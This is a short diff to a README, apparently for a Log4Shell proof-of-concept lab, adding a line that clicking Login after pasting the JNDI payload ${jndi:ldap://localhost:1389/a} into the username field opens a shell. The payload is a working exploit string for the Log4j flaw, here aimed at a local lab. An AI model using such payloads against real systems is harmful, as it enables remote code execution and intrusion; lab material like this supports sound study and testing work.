@@ -198,7 +198,7 @@ docker run --network host log4j-shell-poc
 ```
 Once it is running, you can access it on localhost:8080
 
-Copy the payload ${jndi:ldap://localhost:1389/a} and paste it in the username field of the vulnerable site.
+Copy the payload ${jndi:ldap://localhost:1389/a} and paste it in the username field of the vulnerable site. Click on the Login button to pop a shell.
 
 # Samba config
 ## Create Users password
